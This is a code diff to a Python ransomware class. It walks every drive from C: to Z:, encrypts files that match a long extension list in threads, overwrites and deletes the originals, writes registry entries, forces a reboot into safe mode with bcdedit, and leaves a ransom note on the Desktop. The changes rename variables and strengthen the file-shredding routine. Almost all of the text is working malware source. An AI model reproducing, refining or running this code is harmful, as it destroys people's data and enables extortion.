@@ -21,7 +21,7 @@ class ransomware:
     desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
     note_path = os.path.join(desktop_path, "Note.txt")
     
-    root_files = ["C:\\", "D:\\", "E:\\", "F:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"]
+    root_directories = ["C:\\", "D:\\", "E:\\", "F:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"]
     
     #Extensions
     file_extensions = ['.3ds', '.7z', '.aac', '.accdb', '.accdc', '.accde', '.accdr', '.accdt', '.accdw', '.adts', '.asp', '.aspx', '.avi', '.back', '.bak', '.bmp', '.c', '.cda', '.cfg', '.class', '.conf', '.cpp', '.cs', '.csv', '.db', '.dbf', '.disk', '.djvu', '.doc', '.docm', '.docx', '.dot', '.dotx', '.dwg', '.eml', '.eps', '.fdb', '.gif', '.gz', '.h', '.hdd', '.htm', 
@@ -41,11 +41,11 @@ class ransomware:
         self.extensions = self.file_extensions.copy()
         temp_list = []
         
-        for file in self.root_files:
+        for file in self.root_directories:
             if os.path.exists(file):
                 temp_list.append(file)
         
-        self.root_files = temp_list.copy()
+        self.root_directories = temp_list.copy()
 
     def generate_keys(self):
         random = Random.new().read
@@ -88,7 +88,7 @@ class ransomware:
     def encrypt_system(self):
         try:
             threads = []
-            for file in self.root_files:
+            for file in self.root_directories:
                 thread = threading.Thread(target=self.encrypt_directory, args=(file, ))
                 thread.daemon = True
                 threads.append(thread)
@@ -109,18 +109,18 @@ class ransomware:
 
     def shred(self, path, times_to_repeat=5):
         try:
+            f = open(path, 'w').close()
             for i in range(times_to_repeat):
-                data = base64.b64encode(self.generate_random_string(400).encode())
-                modified_data = base64.b85encode(data)
-                file = open(path, 'w')
-                
-                file.write(modified_data.decode())                                            
-                file.close()            
+                data = base64.b85encode(base64.b64encode(self.generate_random_string(400).encode()))
+                data += os.urandom(50)
+                with open(path, "ba+") as file:                
+                    file.write(data)
             
             name = self.generate_random_string(30)
             os.rename(path, name)
             os.unlink(name)
-        except Exception:
+        except Exception as e:
+            print(e)
             pass
 
     def write_to_registry(self):
@@ -192,10 +192,8 @@ class ransomware:
         except Exception:
             pass
     
-    #TODO
     def reboot_into_safe_mode(self):
-        try:            
-            #Hijack using MBR            
+        try:
             os.system(r'cmd /k "{}"'.format("bcdedit /set {default} safeboot minimal"))
             os.system("shutdown /r /t 0")
         except Exception:
@@ -205,7 +203,7 @@ class ransomware:
         try:
             with open(self.note_path, 'w') as file:
                 file.write("If you see this text, then all of your files including your Photos, Documents, Videos... have been encrypted.\nThey are NO LONGER accessible.\nPlease save yourself a couple of hours, by not searching for a decryption service, because that won't work.\n\nHow to get my files back?\nTo get your files back you will need to donate at least 50$ to charity.\nWe will detect the donation and decrypt all of your files.\n\nPlease do not modify the encrypted files or we might not be able to restore them.")
-            
+
             return True
         except Exception:
             return False
